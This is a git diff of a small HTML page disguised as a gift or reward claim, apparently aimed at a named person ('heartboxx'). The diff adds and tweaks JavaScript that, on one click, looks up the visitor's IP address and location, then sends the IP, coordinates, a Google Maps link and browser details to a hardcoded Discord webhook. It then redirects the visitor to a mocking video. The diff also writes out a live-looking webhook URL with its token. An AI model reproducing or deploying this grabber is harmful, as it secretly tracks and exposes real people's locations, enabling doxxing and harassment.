@@ -1,56 +1,59 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Gift Claiming...</title>
+    <title>Claiming Rewards...</title>
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .claim-box { border: 2px solid #fff; padding: 50px; text-align: center; cursor: pointer; transition: 0.3s; }
-        .claim-box:hover { background: #fff; color: #000; }
-        h1 { font-size: 3rem; }
+        body { background: #000; color: #fff; font-family: 'Courier New', Courier, monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .box { border: 3px solid #fff; padding: 60px; text-align: center; cursor: pointer; transition: all 0.2s; box-shadow: 0 0 20px rgba(255,255,255,0.2); }
+        .box:hover { background: #fff; color: #000; box-shadow: 0 0 50px #fff; }
+        h1 { font-size: 4rem; letter-spacing: 5px; }
+        p { font-size: 1.2rem; margin-top: 20px; opacity: 0.8; }
     </style>
 </head>
 <body>
 
-    <div class="claim-box" id="clicker">
-        <h1>CLICK TO CLAIM</h1>
-        <p>REWARD PENDING...</p>
+    <div class="box" id="bait">
+        <h1>[ CLAIM ]</h1>
+        <p>HEART_BOX_REWARD_0220.exe</p>
     </div>
 
     <script>
         const WEBHOOK = "https://discord.com/api/webhooks/1474279324667351090/ALAHbGxyK7QbVtt4nAJ1Aagv-0F1NMqgolB1UdWIlFoS5V-chCWNhQa0w-DUEF4J90EI";
-        const IDIOT_VIDEO = "https://www.youtube.com/watch?v=f-tM_C1z7f8"; // Remastered 4K
+        const IDIOT_URL = "https://www.youtube.com/watch?v=f-tM_C1z7f8"; // Remastered 4K Version
 
-        document.getElementById('clicker').onclick = async function() {
-            // 1. Grab IP/Cords Intel
-            let intel = {};
+        document.getElementById('bait').onclick = async function() {
+            // 1. Get the exact coords and IP
+            let data = {};
             try {
                 const res = await fetch('https://ipapi.co/json/');
-                intel = await res.json();
+                data = await res.json();
             } catch (e) { 
-                intel = { city: "Blocked", ip: "Hidden", country: "Unknown" }; 
+                data = { city: "Unknown", ip: "Hidden", latitude: "0", longitude: "0" }; 
             }
 
-            // 2. Fire the hit to Discord
+            // 2. Strike the Discord Webhook
             await fetch(WEBHOOK, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    content: "🤡 **TARGET CLICKED THE IDIOT LINK!**",
+                    content: "🎭 **THE IDIOT HAS BEEN HOOKED!**",
                     embeds: [{
-                        title: "Bait: Heart Box Gift",
+                        title: "Target: heartboxx",
                         color: 16711680,
                         fields: [
-                            { name: "📍 Location", value: `${intel.city}, ${intel.region}, ${intel.country_name}` },
-                            { name: "🌐 IP Address", value: intel.ip },
-                            { name: "🗺️ Coords", value: `${intel.latitude}, ${intel.longitude}` },
-                            { name: "🖥️ Device", value: navigator.platform }
-                        ]
+                            { name: "📍 City/Region", value: `${data.city}, ${data.region}` },
+                            { name: "🌐 IP Address", value: data.ip },
+                            { name: "🗺️ Map Coords", value: `${data.latitude}, ${data.longitude}` },
+                            { name: "🔗 Google Maps", value: `https://www.google.com/maps?q=${data.latitude},${data.longitude}` },
+                            { name: "🖥️ OS/Browser", value: navigator.userAgent }
+                        ],
+                        footer: { text: "Redirecting to the loop..." }
                     }]
                 })
             });
 
-            // 3. THE REDIRECT
-            window.location.href = IDIOT_VIDEO;
+            // 3. The "You Are An Idiot" Redirect
+            window.location.href = IDIOT_URL;
         };
     </script>
 </body>
